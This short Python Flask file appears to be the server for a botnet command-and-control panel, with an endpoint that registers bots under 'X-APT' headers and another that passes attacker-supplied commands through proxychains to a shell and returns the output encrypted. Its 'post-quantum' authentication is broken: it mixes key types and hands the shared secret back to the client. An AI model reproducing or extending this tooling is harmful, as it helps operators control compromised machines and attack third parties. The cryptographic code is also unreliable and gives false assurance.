from flask import jsonify, request
from flask_limiter import Limiter
from cryptography.hazmat.primitives import serialization
import subprocess

limiter = Limiter(key_func=lambda: request.headers.get('X-APT-Key'))

@limiter.limit("10/minute")
def register_bot():
    encrypted_data = request.get_json()
    bot_id = decrypt_data(encrypted_data['payload'])
    bots_db.insert(bot_id)
    return jsonify({"status": "active"})

def execute_command():
    auth_token = request.headers.get('X-APT-Token')
    if validate_quantum_token(auth_token):
        target = request.json['target']
        cmd = request.json['command']
        result = subprocess.check_output(f"proxychains -q {cmd}", shell=True)
        return encrypt_data(result)
    return jsonify({"error": "Quantum auth failed"}), 403

def quantum_auth():
    # Post-Quantum KEM Key Exchange
    client_pk = serialization.load_pem_public_key(request.data)
    server_sk = load_kyber_key()
    ct, ss = server_sk.encapsulate(client_pk)
    return jsonify({"ciphertext": ct, "secret": ss})
